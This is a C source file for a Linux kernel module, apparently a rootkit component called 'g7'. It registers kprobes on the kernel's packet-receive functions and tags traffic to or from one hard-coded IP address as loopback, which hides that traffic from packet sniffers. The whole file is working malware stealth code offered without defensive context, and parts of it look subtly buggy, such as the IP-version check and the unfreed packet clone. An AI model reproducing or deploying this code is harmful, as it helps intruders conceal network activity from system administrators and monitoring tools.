#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <uapi/linux/if_packet.h>
#include <uapi/linux/ip.h>
#include <uapi/linux/ipv6.h>

#include "common.h"
#include "hook.h"

static int g7_packet_rcv(struct kprobe *, struct pt_regs *);
static int g7_fault(struct kprobe *, struct pt_regs *, int);
static void g7_post(struct kprobe *, struct pt_regs *m, unsigned long);

//TODO store in array of kprobes
static struct kprobe p_rcv = {
    .symbol_name    = "packet_rcv",
};

static struct kprobe tp_rcv = {
    .symbol_name    = "tpacket_rcv",
};

static struct kprobe p_rcv_spkt = {
    .symbol_name    = "packet_rcv_spkt",
};

void
hide_packets(void)
{
    p_rcv.pre_handler = g7_packet_rcv;
    p_rcv.post_handler = g7_post;
    p_rcv.fault_handler = g7_fault;

    tp_rcv.pre_handler = g7_packet_rcv;
    tp_rcv.post_handler = g7_post;
    tp_rcv.fault_handler = g7_fault;

    p_rcv_spkt.pre_handler = g7_packet_rcv;
    p_rcv_spkt.post_handler = g7_post;
    p_rcv_spkt.fault_handler = g7_fault;

    if (register_kprobe(&p_rcv))
        DEBUG_INFO("[g7] Could not insert kprobe p_rcv\n");
    
    if (register_kprobe(&tp_rcv))
        DEBUG_INFO("[g7] Could not insert kprobe tp_rcv\n");
    
    if (register_kprobe(&p_rcv_spkt))
        DEBUG_INFO("[g7] Could not insert kprobe p_rcv_spkt\n");
}

void
unhide_packets(void)
{
    unregister_kprobe(&p_rcv);
    unregister_kprobe(&tp_rcv);
    unregister_kprobe(&p_rcv_spkt);
}

static int
g7_packet_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
{
    struct sk_buff *skb;
    skb = (struct sk_buff *)pt_regs->di;

    char *data = skb_network_header(skb);
    char ver = data[0];

    if ((ver & 0x40)) {
        struct iphdr *iphdr;
        struct sk_buff *clone = skb_clone(skb, GFP_KERNEL);

        pt_regs->di = (long unsigned int)clone;
        iphdr = (struct iphdr *)skb_network_header(clone);
        
        if (iphdr->saddr == 0x08080808 || iphdr->daddr == 0x08080808)
            clone->pkt_type = PACKET_LOOPBACK;
    }

    return 0;
}

static void 
g7_post(struct kprobe *kp, struct pt_regs *pt_regs, unsigned long flags)
{
    return;
}

static int
g7_fault(struct kprobe *kp, struct pt_regs *pt_regs, int trapnr)
{
    return 0;
}